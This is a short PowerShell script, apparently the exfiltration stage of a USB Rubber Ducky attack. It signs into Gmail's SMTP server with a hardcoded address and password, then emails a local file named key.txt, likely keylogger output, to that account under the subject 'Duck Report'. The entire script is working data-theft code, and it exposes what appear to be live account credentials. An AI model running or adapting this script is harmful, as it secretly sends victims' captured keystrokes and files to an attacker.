$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'duckysys@gmail.com'
$ReportEmail.To.Add('duckysys@gmail.com')
$ReportEmail.Subject = 'Duck Report'
$ReportEmail.Body = 'Attached is your duck report.... Quack' 
$files="C:\l\key.txt"
$ReportEmail.Attachments.Add($files)
$SMTPInfo.Send($ReportEmail)
